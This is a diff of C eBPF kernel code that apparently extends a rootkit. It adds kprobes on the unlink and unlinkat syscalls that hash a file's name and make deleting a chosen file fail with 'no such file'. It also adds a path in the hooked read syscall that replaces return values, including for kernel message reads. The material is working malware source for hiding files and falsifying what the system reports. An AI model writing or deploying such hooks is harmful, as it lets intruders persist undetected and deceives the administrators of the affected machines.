@@ -84,7 +84,7 @@ static __attribute__((always_inline)) struct rk_path_attr_t *get_path_attr(struc
             if (path_attr->action.id)
             {
                 if (!path_attr->fs_hash || path_attr->fs_hash == get_fs_hash(dentry))
-                {
+                { 
                     return path_attr;
                 }
             }
@@ -129,6 +129,68 @@ static __attribute__((always_inline)) int access_path(struct path *path)
     bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);
 
     return 0;
+}
+
+static __attribute__((always_inline)) int handle_unlink(struct pt_regs *ctx, const char *filename)
+{
+    u64 rk_hash;
+    LOAD_CONSTANT("rk_hash", rk_hash);
+
+    if (!rk_hash)
+    {
+        return 0;
+    }
+
+    const char basename[256];
+    bpf_probe_read_str((void *)basename, sizeof(basename), (void *)filename);
+
+    u64 hash = FNV_BASIS;
+
+#pragma unroll
+    for (int i = 0; i != 256; i++)
+    {
+        if (basename[i] == '\0')
+        {
+            bpf_printk(">>>: %lu %lu\n", hash, rk_hash);
+
+            if (hash == rk_hash)
+            {
+                bpf_override_return(ctx, -ENOENT);
+            }
+        }
+        else if (basename[i] == '/')
+        {
+            hash = FNV_BASIS;
+        }
+        else
+        {
+            update_hash_byte(&hash, basename[i]);
+        }
+    }
+
+    return 0;
+}
+
+SEC("kprobe/__x64_sys_unlink")
+int __x64_sys_unlink(struct pt_regs *ctx)
+{
+    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
+
+    const char *filename = NULL;
+    bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM1(rctx));
+
+    return handle_unlink(ctx, filename);
+}
+
+SEC("kprobe/__x64_sys_unlinkat")
+int __x64_sys_unlinkat(struct pt_regs *ctx)
+{
+    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
+
+    const char *filename = NULL;
+    bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM2(rctx));
+
+    return handle_unlink(ctx, filename);
 }
 
 SEC("kprobe/vfs_open")
@@ -321,6 +383,15 @@ int __x64_sys_read_ret(struct pt_regs *ctx)
     if (fd_attr->action.id & OVERRIDE_CONTENT_ACTION)
     {
         override_content(ctx, fd_attr);
+    }
+    else if (fd_attr->action.id & OVERRIDE_RETURN_ACTION)
+    {
+        bpf_override_return(ctx, fd_attr->action.return_value);
+
+        if (fd_attr->action.id & KMSG_ACTION)
+        {
+            fd_attr->action.id &= ~OVERRIDE_RETURN_ACTION;
+        }
     }
 
     return 0;
